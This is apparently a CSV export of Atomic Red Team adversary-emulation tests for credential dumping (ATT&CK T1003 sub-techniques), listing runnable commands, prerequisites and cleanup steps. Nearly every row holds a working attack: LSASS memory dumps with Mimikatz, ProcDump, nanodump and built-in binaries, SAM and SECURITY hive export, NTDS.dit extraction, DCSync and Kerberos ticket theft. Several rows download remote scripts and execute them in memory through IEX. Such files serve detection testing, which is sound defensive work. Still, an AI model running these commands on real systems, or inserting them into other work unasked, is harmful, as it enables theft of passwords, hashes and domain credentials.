"TechniqueID","TestName","Command","PrereqCommand","CleanupCommand","SourceFile"
"T1003.001","Offline Credential Theft With Mimikatz","""#{mimikatz_exe}"" ""sekurlsa::minidump #{input_file}"" ""sekurlsa::logonpasswords full"" exit
","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing) 
$releases = ""https://api.github.com/repos/gentilkiwi/mimikatz/releases""
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith("".zip"") }
$basePath = Split-Path ""#{mimikatz_exe}"" | Split-Path
Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath

---
Write-Host ""Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)""
","","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml"
"T1003.001","LSASS read with pypykatz","""#{venv_path}\Scripts\pypykatz"" live lsa 
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
invoke-webrequest ""https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe""
Start-Process -FilePath ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"" -ArgumentList ""/quiet InstallAllUsers=1 PrependPath=1 Include_test=0"" -Wait

---
py -m venv ""#{venv_path}""

---
& ""#{venv_path}\Scripts\pip.exe"" install --no-cache-dir pypykatz 2>&1 | Out-Null
","del ""%temp%\nanodump.dmp"" > nul 2> nul
","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml"
"T1003.001","Dump LSASS.exe Memory using Out-Minidump.ps1","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
try{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}
catch{ $_; exit $_.Exception.Response.StatusCode.Value__}
get-process lsass | Out-Minidump
","","Remove-Item $env:TEMP\lsass_*.dmp -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml"
"T1003.001","Create Mini Dump of LSASS.exe using ProcDump","""#{procdump_exe}"" -accepteula -mm lsass.exe #{output_file}
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://download.sysinternals.com/files/Procdump.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\Procdump.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\Procdump"" -Force
New-Item -ItemType Directory (Split-Path ""#{procdump_exe}"") -Force | Out-Null
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\Procdump\Procdump.exe"" ""#{procdump_exe}"" -Force
","del ""#{output_file}"" >nul 2> nul
","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml"
"T1003.001","Powershell Mimikatz","IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds
","","","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml"
"T1003.001","Dump LSASS with createdump.exe from .Net v5","$exePath =  resolve-path ""$env:ProgramFiles\dotnet\shared\Microsoft.NETCore.App\5*\createdump.exe""
& ""$exePath"" -u -f $env:Temp\dotnet-lsass.dmp (Get-Process lsass).id
","winget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements --accept-package-agreements --silent
","Remove-Item $env:Temp\dotnet-lsass.dmp -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml"
"T1003.001","Dump LSASS.exe using imported Microsoft DLLs","#{xordump_exe} -out #{output_file} -x 0x41
","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest ""https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe"" -OutFile #{xordump_exe}
","Remove-Item #{output_file} -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml"
"T1003.001","Dump LSASS.exe using lolbin rdrleakdiag.exe","if (Test-Path -Path ""$env:SystemRoot\System32\rdrleakdiag.exe"") {
      $binary_path = ""$env:SystemRoot\System32\rdrleakdiag.exe""
  } elseif (Test-Path -Path ""$env:SystemRoot\SysWOW64\rdrleakdiag.exe"") {
      $binary_path = ""$env:SystemRoot\SysWOW64\rdrleakdiag.exe""
  } else {
      $binary_path = ""File not found""
      exit 1
  }
$lsass_pid = get-process lsass |select -expand id
if (-not (Test-Path -Path""$env:TEMP\t1003.001-13-rdrleakdiag"")) {New-Item -ItemType Directory -Path $env:TEMP\t1003.001-13-rdrleakdiag -Force} 
write-host $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
& $binary_path /p $lsass_pid /o $env:TEMP\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1
Write-Host ""Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\t1003.001-13-rdrleakdiag directory.""
","","Remove-Item $env:TEMP\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore
","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml"
"T1003.001","Dump LSASS.exe Memory through Silent Process Exit","PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe --silent-process-exit ""#{output_folder}""
","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction Ignore -Force | Out-Null
Invoke-WebRequest ""https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\nanodump.x64.exe""
","rmdir ""#{output_folder}"" /s /q >nul 2> nul
","C:\AtomicRedTeam\atomics\T1003.001\T1003.001.yaml"
"T1003.002","Registry dump of SAM, creds, and secrets","reg save HKLM\sam %temp%\sam
reg save HKLM\system %temp%\system
reg save HKLM\security %temp%\security
","","del %temp%\sam >nul 2> nul
del %temp%\system >nul 2> nul
del %temp%\security >nul 2> nul
","C:\AtomicRedTeam\atomics\T1003.002\T1003.002.yaml"
"T1003.002","Registry parse with pypykatz","""#{venv_path}\Scripts\pypykatz"" live lsa 
","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
invoke-webrequest ""https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe"" -outfile ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe""
Start-Process -FilePath ""PathToAtomicsFolder\..\ExternalPayloads\python_setup.exe"" -ArgumentList ""/quiet InstallAllUsers=1 PrependPath=1 Include_test=0"" -Wait

---
py -m venv ""#{venv_path}""

---
& ""#{venv_path}\Scripts\pip.exe"" install --no-cache-dir pypykatz 2>&1 | Out-Null
","","C:\AtomicRedTeam\atomics\T1003.002\T1003.002.yaml"
"T1003.002","esentutl.exe SAM copy","esentutl.exe /y /vss #{file_path} /d #{copy_dest}/#{file_name}
","","del #{copy_dest}\#{file_name} >nul 2>&1
","C:\AtomicRedTeam\atomics\T1003.002\T1003.002.yaml"
"T1003.002","PowerDump Hashes and Usernames from Registry","Write-Host ""STARTING TO SET BYPASS and DISABLE DEFENDER REALTIME MON"" -fore green
Import-Module ""PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1""
Invoke-PowerDump","New-Item -Type Directory ""PathToAtomicsFolder\..\ExternalPayloads\"" -ErrorAction ignore -Force | Out-Null
Invoke-Webrequest -Uri ""https://raw.githubusercontent.com/BC-SECURITY/Empire/c1bdbd0fdafd5bf34760d5b158dfd0db2bb19556/data/module_source/credentials/Invoke-PowerDump.ps1"" -UseBasicParsing -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PowerDump.ps1""","","C:\AtomicRedTeam\atomics\T1003.002\T1003.002.yaml"
"T1003.002","dump volume shadow copy hives with certutil","for /L %a in (1,1,#{limit}) do @(certutil -f -v -encodehex ""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy%a\Windows\System32\config\#{target_hive}"" %temp%\#{target_hive}vss%a 2 >nul 2>&1) & dir /B %temp%\#{target_hive}vss*
","","for /L %a in (1,1,#{limit}) do @(del %temp%\#{target_hive}vss%a >nul 2>&1)
","C:\AtomicRedTeam\atomics\T1003.002\T1003.002.yaml"
"T1003.002","dump volume shadow copy hives with System.IO.File","1..#{limit} | % { 
 try { [System.IO.File]::Copy(""\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy$_\Windows\System32\config\#{target_hive}"" , ""$env:TEMP\#{target_hive}vss$_"", ""true"") } catch {}
 ls ""$env:TEMP\#{target_hive}vss$_"" -ErrorAction Ignore
}
","","1..#{limit} | % {
  rm ""$env:TEMP\#{target_hive}vss$_"" -ErrorAction Ignore
}
","C:\AtomicRedTeam\atomics\T1003.002\T1003.002.yaml"
"T1003.002","WinPwn - Loot local Credentials - Dump SAM-File for NTLM Hashes","iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')
samfile -consoleoutput -noninteractive  ","","","C:\AtomicRedTeam\atomics\T1003.002\T1003.002.yaml"
"T1003.002","Dumping of SAM, creds, and secrets(Reg Export)","reg export HKLM\sam %temp%\sam
reg export HKLM\system %temp%\system
reg export HKLM\security %temp%\security
","","del %temp%\sam >nul 2> nul
del %temp%\system >nul 2> nul
del %temp%\security >nul 2> nul
","C:\AtomicRedTeam\atomics\T1003.002\T1003.002.yaml"
"T1003.003","Create Volume Shadow Copy with vssadmin","vssadmin.exe create shadow /for=#{drive_letter}
","echo Sorry, Promoting this machine to a Domain Controller must be done manually
","","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml"
"T1003.003","Copy NTDS.dit from Volume Shadow Copy","copy #{vsc_name}\Windows\NTDS\NTDS.dit #{extract_path}\ntds.dit
copy #{vsc_name}\Windows\System32\config\SYSTEM #{extract_path}\VSC_SYSTEM_HIVE
reg save HKLM\SYSTEM #{extract_path}\SYSTEM_HIVE
","echo Sorry, Promoting this machine to a Domain Controller must be done manually

---
echo Run ""Invoke-AtomicTest T1003.003 -TestName 'Create Volume Shadow Copy with vssadmin'"" to fulfill this requirement

---
mkdir #{extract_path}
","del ""#{extract_path}\ntds.dit""        >nul 2> nul
del ""#{extract_path}\VSC_SYSTEM_HIVE"" >nul 2> nul
del ""#{extract_path}\SYSTEM_HIVE""     >nul 2> nul
","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml"
"T1003.003","Dump Active Directory Database with NTDSUtil","mkdir #{output_folder}
ntdsutil ""ac i ntds"" ""ifm"" ""create full #{output_folder}"" q q
","echo Sorry, Promoting this machine to a Domain Controller must be done manually
","rmdir /q /s #{output_folder} >nul 2>&1
","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml"
"T1003.003","Create Volume Shadow Copy with WMI","wmic shadowcopy call create Volume=#{drive_letter}
","echo Sorry, Promoting this machine to a Domain Controller must be done manually
","","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml"
"T1003.003","Create Volume Shadow Copy remotely with WMI","wmic /node:""#{target_host}"" shadowcopy call create Volume=#{drive_letter}
","echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)
","","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml"
"T1003.003","Create Volume Shadow Copy remotely (WMI) with esentutl","wmic /node:""#{target_host}"" process call create ""cmd.exe /c esentutl.exe /y /vss #{source_path} /d #{target_path}""
","echo Sorry, can't connect to target host, check: network, firewall or permissions (must be admin on target)
","","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml"
"T1003.003","Create Volume Shadow Copy with Powershell","(gwmi -list win32_shadowcopy).Create('#{drive_letter}','ClientAccessible')
","","","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml"
"T1003.003","Create Symlink to Volume Shadow Copy","vssadmin.exe create shadow /for=#{drive_letter}
mklink /D #{symlink_path} \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1
","","","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml"
"T1003.003","Create Volume Shadow Copy with diskshadow","mkdir c:\exfil
diskshadow.exe /s #{filename}
","","","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml"
"T1003.003","Copy NTDS in low level NTFS acquisition via MFT parsing","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR #{script_url} -UseBasicParsing)
Underlay-Copy -Mode MFT -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile #{extract_path}\ntds.dit
Underlay-Copy -Mode MFT -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile #{extract_path}\SYSTEM_HIVE
","","remove-item ""#{extract_path}\ntds.dit"" -force -erroraction silentlycontinue
remove-item ""#{extract_path}\SYSTEM_HIVE"" -force -erroraction silentlycontinue
","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml"
"T1003.003","Copy NTDS in low level NTFS acquisition via fsutil","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (IWR #{script_url} -UseBasicParsing)
Underlay-Copy -Mode Metadata -SourceFile C:\Windows\NTDS\ntds.dit -DestinationFile #{extract_path}\ntds.dit
Underlay-Copy -Mode Metadata -SourceFile C:\Windows\System32\config\SYSTEM -DestinationFile #{extract_path}\SYSTEM_HIVE
","","remove-item ""#{extract_path}\ntds.dit"" -force -erroraction silentlycontinue
remove-item ""#{extract_path}\SYSTEM_HIVE"" -force -erroraction silentlycontinue
","C:\AtomicRedTeam\atomics\T1003.003\T1003.003.yaml"
"T1003.004","Dumping LSA Secrets","""#{psexec_exe}"" -accepteula -s reg save HKLM\security\policy\secrets %temp%\secrets /y
","Invoke-WebRequest ""https://download.sysinternals.com/files/PSTools.zip"" -OutFile ""PathToAtomicsFolder\..\ExternalPayloads\PSTools.zip""
Expand-Archive ""PathToAtomicsFolder\..\ExternalPayloads\PSTools.zip"" ""PathToAtomicsFolder\..\ExternalPayloads\PSTools"" -Force
New-Item -ItemType Directory (Split-Path ""#{psexec_exe}"") -Force | Out-Null
Copy-Item ""PathToAtomicsFolder\..\ExternalPayloads\PSTools\PsExec.exe"" ""#{psexec_exe}"" -Force","del %temp%\secrets >nul 2> nul","C:\AtomicRedTeam\atomics\T1003.004\T1003.004.yaml"
"T1003.004","Dump Kerberos Tickets from LSA using dumper.ps1","Invoke-Expression (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/MzHmO/PowershellKerberos/beed52acda37fc531ef0cb4df3fc2eb63a74bbb8/dumper.ps1')  
","","","C:\AtomicRedTeam\atomics\T1003.004\T1003.004.yaml"
"T1003.005","Cached Credential Dump via Cmdkey","cmdkey /list
","","","C:\AtomicRedTeam\atomics\T1003.005\T1003.005.yaml"
"T1003.006","DCSync (Active Directory)","#{mimikatz_path} ""lsadump::dcsync /domain:#{domain} /user:#{user}@#{domain}"" ""exit""
","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr ""https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1"" -UseBasicParsing) 
$releases = ""https://api.github.com/repos/gentilkiwi/mimikatz/releases""
$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith("".zip"") }
$mimikatz_exe = cmd /c echo #{mimikatz_path}
$basePath = Split-Path $mimikatz_exe | Split-Path
Invoke-FetchFromZip $zipUrl ""x64/mimikatz.exe"" $basePath
","","C:\AtomicRedTeam\atomics\T1003.006\T1003.006.yaml"
